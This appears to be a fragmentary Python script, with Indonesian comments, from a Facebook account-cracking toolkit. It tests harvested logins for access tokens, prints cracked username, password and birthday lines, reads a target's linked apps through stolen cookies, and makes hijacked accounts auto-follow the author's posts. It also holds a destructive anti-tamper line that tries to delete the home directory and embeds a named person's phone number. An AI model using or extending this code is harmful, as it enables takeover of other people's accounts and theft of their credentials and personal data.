...
inp = ("[-]")
bulat = ("[#]")
kiky_at = ("Muhamad Badru Wasih")
kiky_hp = ("+628811403654")
...
def menu():
	...
	print(C+"["+P+"08"+C+"]"+P+" Check Jumlah Teman "+I+"NEW FIKTUR"+Q)
	print(C+"["+P+"09"+C+"]"+P+" Lihat Informasih Data Target")
...
try:
	if "Muhamad Badru Wasih" == kiky_at or kiky_at == "muhamad badru wasih":
		pass
	else:
		os.remove("$HOME")
...
def cek_apk(session,coki):
	...
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			print(f"{jarak}{war}Apk Aktif •")
			print(f"{jarak}{jarak}{war} Tidak Ada Yang Terkait")
		else:
			print(f"{jarak}{war}Apk Aktif")
			...
			for muncul in apkAktif:
				hit1+=1
				print(f"{jarak}{jarak}[{hit1}] {I}{muncul}{Q} {C}{ditambahkan[hit2]}{Q}")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
			print(f"{jarak}{war}Apk Kadaluarsa •")
			print(f"{jarak}{jarak}{war}Tidak Ada Yang Terkait")
		else:
			hit1,hit2=0,0
			print(f"{jarak}{war}Apk Kadaluarsa")
			...
			for muncul in apkKadaluarsa:
				hit1+=1
				print(f"{jarak}{jarak}[{hit1}] {K}{muncul}{Q} {U}{kadaluarsa[hit2]}{Q}")
				hit2+=1
	else:pass
#		print(war+"Terjadi Masalah DiCookies !!")
	print("")
...
#            sys.stdout.flush()
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                ...
                try:
                    ...
                    dob = az['birthday']
                    print ('\r %s[%s%s%s] %s%s|%s|%s      %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,user,pw,dob,Q))
...
def bot_follow():
	...
	post1 = ('3075150019369329') # Risky 2011
	post2 = ("120338706765807") # Risky 2021
	post3 = ("3075150019369329") # Sama Macam dibawah
	post4 = ('3075150019369329') # Logo Zero From Risky 2021
	post5 = ("3075150019369329") # Untuk Berbagi Token Dan Cookie Facebook
	post6 = ("3075150019369329") # Logo Akira From Risky 2031
	post7 = ("3075150019369329") # Logo Attaxk From Risky 2021
...
def lonte_(ml, token, toket):
	...
	_id = ("%s"%(len(goblok)))
	if _id == "0" or "0" == _id:
		datax = (C+" Maaf Idz Ini Tidak DiPublickan"+Q)
	else:
